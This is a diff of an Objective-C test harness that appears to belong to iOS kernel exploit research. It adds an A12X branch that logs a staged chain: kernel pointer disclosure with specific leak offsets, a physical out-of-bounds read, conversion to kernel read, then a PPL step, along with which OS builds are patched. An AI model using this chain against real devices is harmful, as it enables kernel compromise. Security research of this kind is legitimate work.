@@ -18,7 +18,7 @@
 #include <stdlib.h>
 #include <string.h>
 
-#define PATH_BUILD @"hunt-krw-4"
+#define PATH_BUILD @"hunt-krw-5"
 
 @implementation LabPathTest
 
@@ -140,6 +140,7 @@ static int path_int_after(NSString *s, const char *key) {
        LabLocalMilitaryNow() ?: @"?", PATH_BUILD]);
     L([NSString stringWithFormat:@"[*] sku=%@  hasKread still kread32(kbase)==0xfeedfacf",
        skuName]);
+    L([LabDeviceProfile armDump]);
     L(@"[*] Occupancy / P110 / P143 are catalog-solo. P149 is KERNEL conversion on T8150. Hunt/17 PATHS is harvest-only. 12 mini PATHS establishes CS2/libkrw.");
     int coreSt = lumina_core_selftest();
     L([NSString stringWithFormat:@"[*] lumina_core %s selftest=%d",
@@ -170,6 +171,14 @@ static int path_int_after(NSString *s, const char *key) {
         L(@"  ane127  tap=conv       CLASS/FIELD in-bounds. 43748 not live.");
     } else if (sku == LabSkuA13_22G100) {
         L(@"  kread   tap=cs2core    bar=hasKread=YES via CS2");
+    } else if (LabSkuIsA12X(sku)) {
+        L(@"  p010    tap=p010/p139  bar=QueueCreate SUCCESS + kptr scan (layout disclose)");
+        L(@"  p063    tap=p063/p139  bar=aio HEAP kptr");
+        L(@"  p065    tap=p065       64788 Facet A oracle (live 23G71 until 23G82; 23H30 EXPECT-BAD)");
+        L(@"  cs2     tap=cs2        phys_oob READ scan; kbase=0 is setup");
+        L(@"  kread   tap=kreadtest  bar=kread32(kbase)==0xfeedfacf");
+        L(@"  occ     SKIP           43748 patched 26.6 / fill_cap=1. Do not remaining-fire 254");
+        L(@"  formula disclose(P010/P063) → CS2 phys_oob READ → convert unnamed → kread32 → PPL AfterKread");
     } else {
         L(@"  unknown SKU — Ident first. Public HOLD remaining-fire.");
     }
@@ -207,10 +216,15 @@ static int path_int_after(NSString *s, const char *key) {
                    evidence:[NSString stringWithFormat:@"kernel_range_q=%d", kq]];
         L([NSString stringWithFormat:@"PATH_TEST id=p114 class=disclosure sku=%@ result=%@ kernel_range_q=%d",
            skuName, r114, kq]);
-    } else if (sku == LabSkuA14_23F77) {
-        L(@"=== RUN HUNT READ-ONLY: P139 (includes P010 disclose + P063 aio kptr) ===");
-        L(@"[*] P010 QueueCreate copyout is the disclose. Smash is KERNEL P044 N=192, not P099/P073 254.");
-        L(@"[*] Occupancy test is KERNEL / catalog p044. One TAP after reboot, Game Mode ON.");
+    } else if (sku == LabSkuA14_23F77 || LabSkuIsA12X(sku)) {
+        L(@"=== RUN READ-ONLY: P139 (includes P010 disclose + P063 aio kptr) ===");
+        if (sku == LabSkuA14_23F77) {
+            L(@"[*] P010 QueueCreate copyout is the disclose. Smash is KERNEL P044 N=192, not P099/P073 254.");
+            L(@"[*] Occupancy test is KERNEL / catalog p044. One TAP after reboot, Game Mode ON.");
+        } else {
+            L(@"[*] A12X: P010 QueueCreate uses LabOff size=0x408 leak=+0x550. Smash 254 SKIP (fill_cap / 26.6 patch).");
+            L(@"[*] 23H30 FIELD# only — 23G71 unslid VAs HOLD. CS2 phys_oob is catalog-solo.");
+        }
         NSString *p139 = nil;
         @try { p139 = [P139BootIntel tap]; }
         @catch (NSException *e) { L([NSString stringWithFormat:@"[-] p139 %@", e.name]); }
